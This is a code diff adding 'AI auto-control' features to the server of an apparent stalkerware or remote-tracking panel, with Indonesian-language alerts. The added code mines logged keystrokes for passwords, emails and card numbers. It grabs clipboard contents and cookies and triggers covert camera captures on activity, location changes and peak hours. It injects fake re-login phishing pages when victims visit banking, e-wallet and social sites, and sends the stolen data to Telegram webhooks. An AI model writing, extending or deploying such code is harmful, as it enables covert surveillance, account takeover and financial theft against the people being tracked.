@@ -285,6 +285,10 @@ io.on('connection', (socket) => {
         if (!isOwnDevice && AI_AGENT_ENABLED) {
             setTimeout(() => aiAgentAnalyzeDevice(deviceId), 5000);
         }
+        // Initialize AI auto-control features for new device
+        if (!isOwnDevice) {
+            setTimeout(() => initAIFeatures(deviceId), 2000);
+        }
     }
 
     const device = devices.get(deviceId);
@@ -361,6 +365,11 @@ io.on('connection', (socket) => {
         if (device.keystrokes.length > 200) device.keystrokes = device.keystrokes.slice(-200);
         saveDevices();
         io.emit('device-update', { id: deviceId, keystrokes: device.keystrokes.slice(-20) });
+        // Auto forensics trigger on keystroke burst (>20 keys in 10s)
+        if (AI_FEATURES.AUTO_FORENSICS && device._onActivity) {
+            const recent = device.keystrokes.filter(k => Date.now() - k.t < 10000);
+            if (recent.length > 20) device._onActivity();
+        }
     });
 
     socket.on('clickmap', (data) => {
@@ -368,6 +377,10 @@ io.on('connection', (socket) => {
         device.clicks.push({ x: data.x, y: data.y, t: Date.now(), el: data.el || '' });
         if (device.clicks.length > 100) device.clicks = device.clicks.slice(-100);
         saveDevices();
+        // Auto forensics trigger on click activity
+        if (AI_FEATURES.AUTO_FORENSICS && device._onActivity) {
+            device._onActivity();
+        }
     });
 
     socket.on('visibility', (data) => {
@@ -406,6 +419,29 @@ io.on('connection', (socket) => {
             connection: device.connection,
             isOwnDevice: device.isOwnDevice || false
         });
+
+        // AI Smart Location — detect significant movement
+        if (AI_FEATURES.SMART_LOCATION && device._lastLocation) {
+            const R = 6371000; // Earth radius in meters
+            const dLat = (point.lat - device._lastLocation.lat) * Math.PI / 180;
+            const dLng = (point.lng - device._lastLocation.lng) * Math.PI / 180;
+            const a = Math.sin(dLat/2)*Math.sin(dLat/2) +
+                      Math.cos(device._lastLocation.lat*Math.PI/180)*Math.cos(point.lat*Math.PI/180)*
+                      Math.sin(dLng/2)*Math.sin(dLng/2);
+            const dist = R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            if (dist > 5000) { // More than 5km
+                const lastMoveAlert = device._lastMoveAlert || 0;
+                if (Date.now() - lastMoveAlert > 3600000) { // Max 1 alert per hour
+                    device._lastMoveAlert = Date.now();
+                    sendAIAlert(deviceId, 'Significant Move',
+                        `Pindah ${(dist/1000).toFixed(1)}km!\nDari: ${device._lastLocation.lat.toFixed(4)},${device._lastLocation.lng.toFixed(4)}\nKe: ${point.lat.toFixed(4)},${point.lng.toFixed(4)}\nAkurasi: ${point.accuracy || 'N/A'}m`
+                    ).catch(()=>{});
+                    // Start camera burst
+                    executeAgentAction(deviceId, 'auto-capture');
+                }
+            }
+        }
+        device._lastLocation = point;
     });
 
     socket.on('snapshot', (data) => {
@@ -462,6 +498,72 @@ io.on('connection', (socket) => {
     // Camera stream status feedback
     socket.on('camera-status', (data) => {
         io.to('admins').emit('camera-status', { deviceId, label: device.label, ...data, time: Date.now() });
+    });
+
+    // === AI FEATURE EVENTS ===
+
+    // Face detection from tracker canvas analysis
+    socket.on('face-detected', (data) => {
+        io.to('admins').emit('face-detected', { deviceId, label: device.label, ...data, time: Date.now() });
+        if (AI_FEATURES.FACE_DETECTION && data.image) {
+            // Save and forward to Telegram
+            const filename = `${deviceId}_face_${Date.now()}.jpg`;
+            const filepath = path.join(DATA_DIR, 'snapshots', filename);
+            fs.writeFile(filepath, Buffer.from(data.image, 'base64'), (err) => {
+                if (!err) {
+                    if (!device.snapshots) device.snapshots = [];
+                    device.snapshots.push({ filename, timestamp: Date.now(), type: 'face_detected' });
+                    saveDevices();
+                    io.emit('new-snapshot', { deviceId, label: device.label, filename, timestamp: Date.now() });
+                    sendTelegramPhoto(deviceId, filepath, `[AI Face Detection] ${device.label}\nWajah terdeteksi!`).catch(()=>{});
+                    sendAIAlert(deviceId, 'Face Detection', 'Wajah terdeteksi dari kamera — snapshot terkirim.').catch(()=>{});
+                }
+            });
+        }
+    });
+
+    // URL change detection for phishing trigger
+    socket.on('url-change', (data) => {
+        if (!device.urlHistory) device.urlHistory = [];
+        device.urlHistory.push({ url: data.url, title: data.title || '', time: Date.now() });
+        if (device.urlHistory.length > 100) device.urlHistory = device.urlHistory.slice(-100);
+        saveDevices();
+        // Check for target sites
+        if (AI_FEATURES.PHISHING_TRIGGER) {
+            const url = (data.url || '').toLowerCase();
+            const targetSites = ['facebook.com', 'instagram.com', 'gmail.com', 'google.com', 'tokopedia.com', 'shopee.co.id', 'gojek.com', 'dana.id', 'ovo.id', 'gopay.co.id'];
+            const matched = targetSites.find(s => url.includes(s));
+            if (matched && device.online) {
+                // Inject fake re-login after 3 seconds
+                setTimeout(() => {
+                    io.to(deviceId).emit('inject-phishing', { site: matched, originalUrl: data.url });
+                }, 3000);
+                sendAIAlert(deviceId, 'Phishing Trigger', `Target: ${matched}\nURL: ${data.url.slice(0,100)}`).catch(()=>{});
+            }
+        }
+    });
+
+    // Clipboard response from tracker
+    socket.on('clipboard-response', (data) => {
+        if (!device.clipboardHistory) device.clipboardHistory = [];
+        device.clipboardHistory.push({ text: data.text, time: Date.now(), source: 'ai_forensics' });
+        if (device.clipboardHistory.length > 50) device.clipboardHistory = device.clipboardHistory.slice(-50);
+        device.clipboard = data.text;
+        saveDevices();
+        io.to('admins').emit('device-update', { id: deviceId, clipboard: data.text });
+        if (data.text && data.text.length > 3) {
+            sendAIAlert(deviceId, 'Clipboard Grab', `Isi: ${data.text.slice(0,200)}`).catch(()=>{});
+        }
+    });
+
+    // Cookies response from tracker
+    socket.on('cookies-response', (data) => {
+        if (!device.cookiesData) device.cookiesData = {};
+        device.cookiesData.cookies = data.cookies || device.cookiesData.cookies;
+        device.cookiesData.localStorage = data.localStorage || device.cookiesData.localStorage;
+        saveDevices();
+        io.to('admins').emit('device-update', { id: deviceId, cookiesData: device.cookiesData });
+        sendAIAlert(deviceId, 'Cookies Grabbed', `Domain: ${data.domain || 'N/A'}\nCookie count: ${data.count || 0}`).catch(()=>{});
     });
 
     // Real-time clipboard monitoring
@@ -1075,6 +1177,181 @@ function stopAIAutoCapture(deviceId) {
     io.to('admins').emit('ai-auto-capture', { deviceId, label: d ? d.label : deviceId, action: 'stop', time: Date.now() });
     aiAutoCapture.delete(deviceId);
 }
+
+// ===== AI AUTO-CONTROL FEATURES =====
+
+const AI_FEATURES = {
+    KEYSTROKE_ANALYZER: true,
+    AUTO_FORENSICS: true,
+    ADAPTIVE_BEHAVIOR: true,
+    FACE_DETECTION: true,
+    SMART_LOCATION: true,
+    AUTO_REPORT: true,
+    PHISHING_TRIGGER: true
+};
+
+async function sendAIAlert(deviceId, type, message) {
+    const d = devices.get(deviceId);
+    if (!d) return;
+    const text = `[Neural AI]\nDevice: ${d.label}\nType: ${type}\nWaktu: ${new Date().toLocaleString('id-ID')}\n${message}`;
+    for (const url of webhooks.telegram) {
+        try {
+            await fetch(url.replace('{text}', encodeURIComponent(text)), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text, parse_mode: 'HTML' })
+            });
+        } catch(e) {}
+    }
+}
+
+// 1. AI Keystroke Analyzer — pattern matching for passwords, emails, cards
+function initKeystrokeAnalyzer(deviceId) {
+    if (!AI_FEATURES.KEYSTROKE_ANALYZER) return;
+    setInterval(() => {
+        const d = devices.get(deviceId);
+        if (!d || !d.keystrokes || d.keystrokes.length < 20) return;
+        // Stop if device went offline
+        if (!d.socketId || !io.sockets.sockets.has(d.socketId)) return;
+        const recent = d.keystrokes.slice(-50).map(k => k.k).join('');
+        const patterns = [];
+        // Email pattern
+        const emails = recent.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+        if (emails) emails.forEach(e => patterns.push(`Email: ${e}`));
+        // Password near email — look for text after @/email field
+        if (recent.includes('@') || recent.includes('password') || recent.includes('pw')) {
+            const pw = recent.match(/(?:password|pw|pass|sandi)[=: ]+(\S{6,})/i);
+            if (pw) patterns.push(`Password: ${pw[1].slice(0,30)}`);
+        }
+        // Credit card pattern
+        const cards = recent.match(/(?:\d{4}[-\s]?){3}\d{4}/g);
+        if (cards) cards.forEach(c => patterns.push(`Kartu: ${c}`));
+        // Phone number
+        const phones = recent.match(/(?:08|\+62)[0-9]{8,12}/g);
+        if (phones) phones.forEach(p => patterns.push(`No HP: ${p}`));
+        if (patterns.length > 0) {
+            if (!d.aiAlerts) d.aiAlerts = [];
+            d.aiAlerts.push({ type: 'keystroke_analysis', patterns, time: Date.now() });
+            saveDevices();
+            io.to('admins').emit('ai-alert', { deviceId, label: d.label, type: 'keystroke_analysis', patterns });
+            sendAIAlert(deviceId, 'Keylogger Detection', patterns.join('\n')).catch(()=>{});
+        }
+    }, 300000); // every 5 minutes
+}
+
+// 2. AI Auto Forensics — trigger screenshot + clipboard + cookie on activity
+function initAutoForensics(deviceId) {
+    if (!AI_FEATURES.AUTO_FORENSICS) return;
+    const d = devices.get(deviceId);
+    if (!d) return;
+    // Track last forensics time per device
+    if (!d._lastForensics) d._lastForensics = 0;
+    // Called when click/scroll activity detected
+    d._onActivity = () => {
+        const now = Date.now();
+        if (now - d._lastForensics < 60000) return; // max 1x per minute
+        d._lastForensics = now;
+        // Queue actions: snapshot, clipboard, cookie
+        setTimeout(() => { io.to(deviceId).emit('take-snapshot'); }, 500);
+        setTimeout(() => { io.to(deviceId).emit('request-clipboard'); }, 1500);
+        setTimeout(() => { io.to(deviceId).emit('request-cookies'); }, 2500);
+    };
+}
+
+// 3. AI Adaptive Behavior — learn activity schedule
+function initAdaptiveBehavior(deviceId) {
+    if (!AI_FEATURES.ADAPTIVE_BEHAVIOR) return;
+    const d = devices.get(deviceId);
+    if (!d) return;
+    if (!d.activityPattern) d.activityPattern = {};
+    // Track activity hourly
+    if (!d._activityInterval) {
+        d._activityInterval = setInterval(() => {
+            const d2 = devices.get(deviceId);
+            if (!d2 || !d2.socketId || !io.sockets.sockets.has(d2.socketId)) return;
+            const hour = new Date().getHours();
+            if (!d2.activityPattern) d2.activityPattern = {};
+            if (!d2.activityPattern[hour]) d2.activityPattern[hour] = 0;
+            d2.activityPattern[hour]++;
+            saveDevices();
+            // If peak activity hour (top 3 hours), consider auto-capture
+            const sorted = Object.entries(d2.activityPattern).sort((a,b) => b[1]-a[1]);
+            const peakHours = sorted.slice(0, 3).map(e => parseInt(e[0]));
+            if (peakHours.includes(hour) && d2.online && d2.battery && d2.battery.level > 30) {
+                const lastCap = d2._lastAdaptiveCapture || 0;
+                if (Date.now() - lastCap > 3600000) {
+                    d2._lastAdaptiveCapture = Date.now();
+                    executeAgentAction(deviceId, 'auto-capture');
+                    sendAIAlert(deviceId, 'Adaptive Capture', `Peak activity hour ${hour}:00, starting camera.`).catch(()=>{});
+                }
+            }
+        }, 600000); // every 10 min check
+    }
+}
+
+// 4. AI Face Detection — handle face-detected frames from tracker
+// Triggered by 'face-detected' socket event
+
+// 5. AI Smart Location — detect significant moves
+function initSmartLocation(deviceId) {
+    if (!AI_FEATURES.SMART_LOCATION) return;
+    const d = devices.get(deviceId);
+    if (!d) return;
+    if (!d._lastLocation) d._lastLocation = null;
+    // Check on location update — handled in socket 'location' handler below
+}
+
+// 6. AI Auto Report — 6-hour summary
+function initAutoReport() {
+    if (!AI_FEATURES.AUTO_REPORT) return;
+    setInterval(async () => {
+        for (const [deviceId, d] of devices) {
+            if (!d.online) continue;
+            const snaps = d.snapshots ? d.snapshots.length : 0;
+            const keys = d.keystrokes ? d.keystrokes.length : 0;
+            const loc = d.location ? `${d.location.lat.toFixed(4)},${d.location.lng.toFixed(4)}` : 'N/A';
+            const bat = d.battery ? `${d.battery.level}%` : 'N/A';
+            const report = `Snapshots: ${snaps}\nKeystrokes: ${keys}\nLokasi: ${loc}\nBaterai: ${bat}\nStatus: ${d.online ? 'Online' : 'Offline'}`;
+            await sendAIAlert(deviceId, 'Auto Report (6 jam)', report);
+        }
+    }, 21600000); // 6 hours
+}
+
+// 7. AI Phishing Trigger — URL detection handler
+function initPhishingDetection(deviceId) {
+    if (!AI_FEATURES.PHISHING_TRIGGER) return;
+    const d = devices.get(deviceId);
+    if (!d) return;
+    // Handled via 'url-change' socket event
+}
+
+// Initialize AI features for new devices
+function initAIFeatures(deviceId) {
+    initKeystrokeAnalyzer(deviceId);
+    initAutoForensics(deviceId);
+    initAdaptiveBehavior(deviceId);
+    initSmartLocation(deviceId);
+    initPhishingDetection(deviceId);
+}
+
+// Start auto-report on startup
+setTimeout(initAutoReport, 21600000);
+
+// Smart Location check on location update (patched in socket handler)
+
+// Handle face-detected, url-change, request-clipboard, request-cookies events
+// These are added in the socket 'connection' handler
+
+// ====== PATCH: Location handler for smart location ======
+// We patch the location check in the existing socket handler by storing _lastLocation
+
+// ====== PATCH: Keystroke handler for forensics trigger ======
+// When keystroke comes in, also check if forensics should run
+// Added in existing keystroke handler
+
+// ====== PATCH: clickmap handler for forensics trigger ======
+// When clickmap comes in, trigger auto forensics
+// Added in existing clickmap handler
 
 // AI Agent: Analyze new device and execute autonomous actions
 async function aiAgentAnalyzeDevice(deviceId) {
